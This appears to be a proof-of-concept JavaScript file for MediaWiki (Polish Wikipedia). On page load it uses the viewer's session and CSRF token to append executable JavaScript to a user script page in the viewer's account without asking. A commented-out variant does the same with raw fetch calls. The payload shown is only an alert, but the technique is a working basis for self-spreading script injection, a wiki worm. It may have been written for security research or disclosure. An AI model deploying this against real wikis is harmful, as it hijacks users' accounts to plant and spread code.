/**
  A simple Poc that should be withing wiki's CSP.
*/
/**
 * Edits a user JS page on MediaWiki (plwiki).
 * Requires a valid login session + CSRF token.
 */

async function editWiki() {
  /*
	const apiUrl = 'https://pl.wikipedia.org/w/api.php';

	// 1. Get CSRF token
	const tokenResp = await fetch(apiUrl + '?action=query&meta=tokens&type=csrf&format=json', {
		credentials: 'include'
	});
	const tokenData = await tokenResp.json();
	const csrfToken = tokenData.query.tokens.csrftoken;

	// 2. Perform edit
	const params = new URLSearchParams({
		action: 'edit',
		title: 'User:YOUR_USERNAME/wiki-poc--could-be--global.js',
		appendtext: "\nalert('Hi');",
		token: csrfToken,
		format: 'json'
	});

	const editResp = await fetch(apiUrl, {
		method: 'POST',
		body: params,
		credentials: 'include',
		headers: {
			'Content-Type': 'application/x-www-form-urlencoded'
		}
	});

	const result = await editResp.json();
	console.log(result);
  */
  // say hi
  mw.loader.using('mediawiki.api').then(() => {
  	const api = new mw.Api();
    const username = mw.config.get('wgUserName');
  
  	api.postWithToken('csrf', {
  		action: 'edit',
  		title: `User:${username}/wiki-poc--could-be--global.js`,
  		appendtext: "\nalert('Hi');",
  		summary: 'POC edit'
  	}).then(console.log).catch(console.error);
  });
  
}

$(function () {
	console.log('DOM ready');
  editWiki();
});
